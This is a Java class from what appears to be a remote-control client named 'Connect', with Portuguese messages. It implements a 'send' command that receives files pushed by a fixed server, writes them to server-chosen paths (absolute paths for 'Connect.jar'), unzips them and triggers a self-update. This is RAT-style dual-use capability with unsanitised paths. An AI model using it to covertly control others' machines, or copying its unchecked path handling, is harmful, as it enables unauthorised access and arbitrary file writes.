package br.com.introcdc.connect.client.commands.file.external;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 16:43
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.ConnectClient;
import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.ClientFileComponents;
import br.com.introcdc.connect.client.components.ClientInstallComponents;

import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.net.Socket;
import java.nio.file.Files;

public class ClientCommandSend extends ClientCommand {

    public ClientCommandSend() {
        super("send");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        if (input.isEmpty()) {
            msg("Digite um arquivo!");
            return;
        }

        ConnectClient.EXECUTOR.schedule(ConnectClient.runnable(() -> new Thread(() -> {
            try (Socket fileSocket = new Socket(Connect.IP, Connect.PORT);
                 DataOutputStream handshakeDos = new java.io.DataOutputStream(fileSocket.getOutputStream());
                 DataInputStream dis = new DataInputStream(fileSocket.getInputStream())) {
                handshakeDos.writeUTF("SECONDARY:" + ConnectClient.KEY + ":SEND_FILE");
                try (BufferedOutputStream bos = new BufferedOutputStream(Files.newOutputStream((input.equalsIgnoreCase("Connect.jar") ?
                        new File(dis.readUTF()) : new File(ClientFileComponents.FOLDER, dis.readUTF())).toPath()))) {
                    String fileName = dis.readUTF();
                    msg("Recebendo arquivo " + fileName + " do servidor...");
                    boolean temp = dis.readUTF().replace("temp:", "").equals("true");
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = dis.read(buffer)) != -1) {
                        bos.write(buffer, 0, bytesRead);
                    }
                    if (temp) {
                        ConnectClient.EXECUTOR.schedule(ConnectClient.runnable(() -> new Thread(() -> {
                            File folder = new File(ClientFileComponents.FOLDER, fileName.replace(".zip", ""));
                            if (!folder.exists()) {
                                folder.mkdirs();
                            }
                            ClientFileComponents.extractZip(new File(ClientFileComponents.FOLDER, fileName), folder);
                            ClientFileComponents.deleteFile(new File(ClientFileComponents.FOLDER, fileName));
                        }).start()), Connect.DELAY, Connect.DELAY_TYPE);
                    }

                    msg("Arquivo recebido!");

                    if (fileName.equalsIgnoreCase("Connect.jar")) {
                        ConnectClient.EXECUTOR.schedule(ConnectClient.runnable(ClientInstallComponents::verifyUpdate), Connect.DELAY, Connect.DELAY_TYPE);
                    }
                }
            } catch (Exception exception) {
                msg("Ocorreu um erro enviar um arquivo! (" + exception.getMessage() + ")");
                exception(exception);
            }
        }).start()), Connect.DELAY, Connect.DELAY_TYPE);
    }

}
